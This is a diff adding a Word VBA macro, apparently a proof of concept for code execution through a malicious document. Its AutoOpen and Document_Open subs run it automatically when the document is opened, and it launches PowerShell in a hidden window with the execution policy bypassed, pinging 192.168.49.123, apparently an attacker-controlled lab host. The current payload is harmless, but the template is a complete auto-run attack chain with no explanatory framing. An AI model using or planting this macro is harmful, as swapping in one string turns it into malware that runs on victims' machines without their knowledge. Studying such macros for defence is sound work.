@@ -1,0 +1,18 @@
+
+Sub MyMacro()
+    Dim str As String
+    str = "powershell -nop -exec bypass -c ping.exe 192.168.49.123"
+    Shell str, vbHide
+End Sub
+
+Sub Run()
+    MyMacro
+End Sub
+
+Sub Document_Open()
+    Run
+End Sub
+
+Sub AutoOpen()
+    Run
+End Sub
